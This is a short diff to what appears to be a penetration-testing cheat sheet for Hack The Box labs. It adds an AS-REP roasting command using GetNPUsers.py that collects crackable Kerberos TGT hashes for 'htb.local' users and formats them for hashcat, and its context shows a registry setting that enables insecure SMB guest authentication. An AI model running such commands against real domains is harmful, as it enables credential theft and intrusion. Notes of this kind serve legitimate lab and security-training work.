@@ -61,3 +61,9 @@ Regedit
 Browse to: Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters
 Create a DWORD 32bit key: AllowInsecureGuestAuth and set to 1 for on, 0 for off
 ```
+
+## GetNPUSers
+Queries target domain for users with 'Do not require Kerberos preauthentication' set and export their TGTs for cracking
+```
+python GetNPUsers.py htb.local/ -no-pass -usersfile domain_users.txt -format hashcat
+```
